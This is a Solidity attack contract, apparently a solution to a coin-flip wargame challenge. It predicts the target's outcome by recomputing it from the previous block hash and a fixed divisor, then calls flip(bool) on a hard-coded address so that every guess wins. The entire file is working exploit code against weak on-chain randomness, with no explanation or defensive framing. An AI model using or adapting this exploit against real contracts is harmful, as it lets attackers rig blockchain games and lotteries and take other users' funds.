// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address CONTRACT_TARGET = 0x22f4895B548D557dAa5DAed9474DE5607cF10A8A;

    constructor() {
        consecutiveWins = 0;
    }

    function calculateNumber() public view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        return side;
    }

    function submitResult() public {
        bool guess = calculateNumber();
        (bool isSucess, ) = CONTRACT_TARGET.call(abi.encodeWithSignature("flip(bool)", guess));
        require(isSucess, "Call failed");
        consecutiveWins += 1;
    }
}